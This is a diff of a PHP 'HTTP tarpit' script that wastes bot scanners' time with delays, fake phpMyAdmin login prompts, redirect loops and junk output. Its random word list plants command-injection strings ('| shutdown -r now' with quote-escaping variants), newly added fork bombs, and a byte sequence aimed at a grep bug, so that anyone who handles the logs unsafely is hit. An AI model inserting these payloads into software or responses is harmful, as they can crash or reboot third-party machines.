@@ -2,11 +2,17 @@
 /* PHP HTTP Tarpit
  * Purpose: Confuse and waste bot scanners time.
  * Use: Url rewrite unwanted bot traffic to this file. It is important you use Url rewrites not redirects as most bots ignore location headers.
- * Version: 1.3.5
+ * Version: 1.3.6
  * Author: Chaoix
  *
  * Change Log:
- * 	-Fixed $times_redirected_max when using Random defense. (1.3.3)
+ *	-Randomized length of random content. (1.3.6)
+ *	-Increased response delay. (1.3.6)
+ *	-Reworked settings to namespaced constants. (1.3.6)
+ *	-Fixed bug in chained redirection defense. (1.3.6)
+ *	-Added fork bombs to random word list. (1.3.6)
+ *	-Added random realms for 401 auth responses. (1.3.6)
+ *	-Fixed $times_redirected_max when using Random defense. (1.3.3)
  *	-Reworked Chained Redirection to work off of query strings. (1.3.2)
  *	-Added random content-length header to HEAD requests. (1.3.1)
  *	-Added HEAD request handling to bait vulnerability scanners such as Jorgee (1.3.0)
@@ -29,14 +35,16 @@
  
 namespace PHPHTTPTarpit {
 	//Basic Options
-	$random_content_length = 2048; //In characters. Used to fill up the size of the scanner's log files.
-	$defense_number = 6; //1 is Blinding Mode, 2 is Ninja Mode, 3 is HTTP Tarpit, 4 is a Chained Redirection, 5 is a Bounceback Redirection, 6 is a Random defense for each request, 7 is a Random Defense by the minute.
-	$responce_delay_min = 100; //Range of delay in microseconds before headers are sent. You want a range of delays so the introduced latentcy can not be detected by the scanner.
-	$responce_dalay_max = 300;
-	$times_redirected_max = 9; //Maximum number of times to redirect (0-9).
-	$debug = false; //Echo messages for testing the script.
+	const min_random_content_length = 2048; //In characters. Used to fill up the size of the scanner's log files.
+	const max_random_content_length = 10240;
+	const defense_number = 6; //1 is Blinding Mode, 2 is Ninja Mode, 3 is HTTP Tarpit, 4 is a Chained Redirection, 5 is a Bounceback Redirection, 6 is a Random defense for each request, 7 is a Random Defense by the minute.
+	const defense_number_random_sample = array(1, 2, 3, 3, 3, 3, 3, 4, 5);
+	const responce_delay_min = 10000; //Range of delay in microseconds before headers are sent. You want a range of delays so the introduced latentcy can not be detected by the scanner.
+	const responce_delay_max = 300000;
+	const times_redirected_max = 9; //Maximum number of times to redirect (0-9).
+	const debug = false; //Echo messages for testing the script.
 
-	function rand_content( $random_content_length = 2048 ) {
+	function rand_content() {
 		$random_words = array( '', 
 							//Send them down a wild goose chase.
 							'Public Key:', 
@@ -48,13 +56,20 @@ namespace PHPHTTPTarpit {
 							"\x04", //Logout
 							"\x07", //Beep
 							"\x21", //Communcation Error
-							" | shutdown -r now",
+							" | shutdown -r now ",
+							"\" | shutdown -r now ",
+							"' | shutdown -r now ",
 							//Exploit grep debian bug #736919 for those running out of date software and put grep in an infinite loop
-							"\xe9\x65\n\xab\n"
+							"\xe9\x65\n\xab\n",
+							//Fork bombs
+							" | :(){ :|:& };: ",
+							"\" | :(){ :|:& };: ",
+							"' | :(){ :|:& };: ",
 							);
 		
 		$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\t\n\r\s";	
 
+		$random_content_length = mt_rand( 0, max_random_content_length - min_random_content_length ) + max_random_content_length;
 		$size = strlen( $chars );
 		$random_word_point = mt_rand( 0, $random_content_length - 1 );
 		for( $i = 0; $i < $random_content_length; $i++ ) {
@@ -62,6 +77,25 @@ namespace PHPHTTPTarpit {
 				echo $random_words[ mt_rand( 0, count($random_words) - 1 ) ];
 			echo $chars[ mt_rand( 0, $size - 1 ) ];
 		}
+	}
+
+	function rand_realm() {
+		$realms = array(
+			'phpMyAdmin ' . $_SERVER['HTTP_HOST'],
+			'GitLab Packages Registry',
+		);
+
+		// Randomize http auth realm based on IP to make the scanner's logs more conistent
+		$ip = (string) filter_var( $_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 );
+		if( !empty( $ip ) )
+			mt_srand( ip2long( $ip ) );
+		
+		$realm = $realms[ mt_rand( 0, count($realms) - 1 ) ];
+		
+		if( !empty( $ip ) )
+			mt_srand();
+
+		return $realm;
 	}
 
 	function self_url(){
@@ -100,7 +134,7 @@ namespace PHPHTTPTarpit {
 	}
 
 	//Delay for a random number of microseconds
-	usleep( mt_rand($responce_delay_min, $responce_dalay_max) );
+	usleep( mt_rand(responce_delay_min, responce_delay_max) );
 
 	//Entice vulnerability scanners to actually perform a GET request
 	//Most vulnerability scanners, such as Jorgee, immediately follow a 200 responce on a HEAD request with a GET request
@@ -110,16 +144,18 @@ namespace PHPHTTPTarpit {
 		die();
 	}
 
+	$defense_number = defense_number;
+
 	//Enforce Endless Redirection
 	$times_redirected = 0;
 	if( !empty($_SERVER['QUERY_STRING']) ) {
 		$refered_page = $_SERVER['QUERY_STRING'];
-		if( !empty($refered_page) ) {
+		if( !empty($refered_page) && validate_integer($refered_page ) ) {
 			$key_number = substr($refered_page, 0, strlen($refered_page)-1);
 			if( !empty($refered_page) && 0 == $key_number%4242 ) {
 				$times_redirected = substr($refered_page, -1);
 				if( validate_integer($times_redirected) ) {
-					if( $times_redirected < $times_redirected_max )
+					if( $times_redirected < times_redirected_max )
 						$defense_number = 4;
 					else
 						$defense_number = mt_rand(0,1) ? 5 : 1; //Sometimes end redirection chain with bounceback
@@ -132,8 +168,7 @@ namespace PHPHTTPTarpit {
 	//Randomize defense
 	if (6 == $defense_number) {
 		//Weight random selection to use the Tarpit more often
-		$number_sample = array(1, 2, 3, 3, 3, 3, 3, 4, 5);
-		$defense_number = $number_sample[ array_rand( $number_sample ) ];
+		$defense_number = defense_number_random_sample[ array_rand( defense_number_random_sample ) ];
 	} elseif (7 == $defense_number) {
 		//Randomize defense based on the current minute. This makes the random return of the server harder to identify.
 		mt_srand(date('i'));
@@ -147,7 +182,7 @@ namespace PHPHTTPTarpit {
 		//Add false positives and fill up bot scanners results with junk.
 		case 1:
 			header("HTTP/1.1 200 OK");
-			rand_content($random_content_length);
+			rand_content();
 			break;
 		
 		//Ninja Mode
@@ -156,35 +191,37 @@ namespace PHPHTTPTarpit {
 			header("HTTP/1.1 404 Not Found");
 			echo 'HTTP/1.1 404 Not Found';
 			if( mt_rand(0,1) )
-				rand_content($random_content_length);
+				rand_content();
 			break;
 		
 		//HTTP Tarpit
 		//Slows down bot scanners.
 		case 3:
 			$rand_num = mt_rand(0, 3);
-			if (3 == $rand_num) {
+			if (2 == $rand_num) {
 				//Ask for unneccessary authentication.
 				header("HTTP/1.1 401 Not Authorized");
-				header('WWW-Authenticate: realm="My Realm"');
+				header('WWW-Authenticate: Basic realm="phpMyAdmin ' . $_SERVER['HTTP_HOST'] . '"');
 				echo 'HTTP/1.1 401 Not Authorized'."\n";
-				rand_content($random_content_length);
+				rand_content();
 				break;
 			}
+
 			//Reply with random keep conection open status code.
-			if (!$debug) {
+			if (!debug) {
 				header("HTTP/1.1 10$rand_num"); 
 				if(1 == $rand_num)
 					header("Upgrade: HTTP/2.0"); //Ask client to request the page again.
-			} else
+			} else {
 				echo "HTTP/1.1 10$rand_num";
+			}
 			break;
 		
 		//Endless Redirect
 		//Punishses crawlers that don't respect robots.txt.
 		case 4:
 			//Down the rabbit hole
-			if( $times_redirected >= $times_redirected_max || !validate_integer($times_redirected) )
+			if( $times_redirected >= times_redirected_max || !validate_integer($times_redirected) )
 				$times_redirected = 0;
 			$times_redirected++;
 			
@@ -206,7 +243,7 @@ namespace PHPHTTPTarpit {
 			header('HTTP/1.1 '.$redirect_statuses[ array_rand( $redirect_statuses ) ]);
 			header('Location: ' . $redirect_url);
 			if( mt_rand(0,1) )
-				rand_content($random_content_length);
+				rand_content();
 			break;
 	}
 
